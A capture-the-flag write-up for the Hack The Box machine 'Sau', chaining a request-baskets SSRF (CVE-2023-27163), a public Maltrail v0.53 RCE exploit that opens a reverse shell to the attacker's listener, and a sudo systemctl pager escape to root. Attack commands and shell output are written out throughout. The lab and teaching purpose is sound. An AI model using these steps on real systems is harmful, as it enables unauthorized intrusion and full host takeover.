# HTB Write-Up: Sau

| Field | Details |
| --- | --- |
| Platform | [Hack The Box](https://app.hackthebox.com/machines/Sau) |
| Difficulty | Easy |
| OS | Linux |
| Date | October 19, 2026 |

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Enumeration — request-baskets SSRF (CVE-2023-27163)](#enumeration-request-baskets-ssrf-cve-2023-27163)
3. [Initial Access — Maltrail v0.53 Unauthenticated RCE](#initial-access-maltrail-v053-unauthenticated-rce)
4. [Privilege Escalation — sudo systemctl Pager Escape](#privilege-escalation-sudo-systemctl-pager-escape)

## Reconnaissance

Port discovery was performed with **RustScan**:

```bash
rustscan -a 10.129.229.26 --ulimit=5000
```

**Open Ports:**

| Port | Service | Details |
| --- | --- | --- |
| 22 | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 |
| 80 | HTTP | filtered |
| 55555 | HTTP | Golang net/http server |

A detailed scan confirmed the finding:

```bash
nmap -A 10.129.229.26
```

Port 80 is filtered — not reachable directly — while port 55555 is open and serving an unidentified Go-based HTTP service. With SSH requiring credentials, port 55555 is the only real way in.

## Enumeration — request-baskets SSRF (CVE-2023-27163)

Browsing to port 55555 revealed a **Request Baskets** instance — a service for collecting and inspecting arbitrary HTTP requests via a web UI or REST API. Checking the page source identified the running version as **1.2.1**, which is vulnerable to a **Server-Side Request Forgery (SSRF)** flaw tracked as **CVE-2023-27163**, in the `/api/baskets/{name}` component. The flaw lets an attacker point a basket's forward URL at an arbitrary internal address, turning the service into an open proxy for the host's own network.

### Confirming the SSRF

1. A basket was created at `http://10.129.229.26:55555/web/sdtmnaz`
2. Its **Forward URL** was set to the attacker's tun0 IP: `10.10.14.25`
3. **Apply** was clicked

A listener was opened to catch the forwarded request:

```bash
rlwrap nc -nvlp 80
```

The public PoC script for the CVE was then run against the basket:

```bash
./CVE-2023-27163.sh http://10.129.229.26:55555/sdtmnaz http://10.10.14.25
```

The listener caught the forwarded request, confirming the basket would relay requests wherever it was pointed:

```
listening on [any] 80 ...
connect to [10.10.14.25] from (UNKNOWN) [10.129.229.26] 41792
POST / HTTP/1.1
Host: 10.10.14.25
User-Agent: curl/8.22.0
Content-Length: 118
Accept: */*
Content-Type: application/json
X-Do-Not-Forward: 1
Accept-Encoding: gzip
```

### Reaching the Filtered Port 80

Since Nmap showed port 80 as filtered from the outside, the same SSRF primitive was used to reach it from inside the host. The basket was reconfigured to forward to `http://127.0.0.1:80`, with two additional settings enabled: **Proxy Response**, so the basket relays the backend's actual response back to the client instead of its own configured response, and **Expand Forward Path**, so a compound request path is forwarded correctly.

1. Forward URL set to `http://127.0.0.1`
2. **Proxy Response** enabled
3. **Expand Forward Path** enabled
4. **Apply** clicked, then the basket accessed directly:

```
http://10.129.229.26:55555/sdtmnaz
```

The response now came from whatever was listening on localhost:80. The page footer identified it: **Powered by Maltrail (v0.53)**.

## Initial Access — Maltrail v0.53 Unauthenticated RCE

Maltrail v0.53 has a known public exploit for unauthenticated remote code execution: [josephberger/Maltrail-v0.53-RCE](https://github.com/josephberger/Maltrail-v0.53-RCE).

A listener was opened:

```bash
rlwrap nc -nvlp 4444
```

And the exploit run against the Maltrail instance, reached through the same SSRF proxy as before:

```bash
python3 exploit.py 10.10.14.25 4444 http://10.129.229.26:55555/sdtmnaz
```

The listener caught a shell:

```
➜  Sau rlwrap nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.25] from (UNKNOWN) [10.129.229.26] 35716
$ whoami
puma
```

The user flag was retrieved from `puma`'s home directory:

```
puma@sau:/opt/maltrail$ cd /home/puma
puma@sau:~$ cat user.txt
40e7bfb3f361822cf5e6177600f35775
```

## Privilege Escalation — sudo systemctl Pager Escape

Sudo permissions were checked for `puma`:

```bash
sudo -l
```

**Output:**

```
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

`puma` can run `systemctl status` on `trail.service` as any user, with no password. `systemctl status` pipes its output through a pager (`less` by default), and `less` supports a `!` shell-escape command — so a command meant only to display status output can be abused to drop into a root shell.

```bash
sudo /usr/bin/systemctl status trail.service
```

Inside the pager:

```
!sh
```

**Result:**

```
# whoami
root
# cat /root/root.txt
c525555830a108c2516ef520db5a179e
```
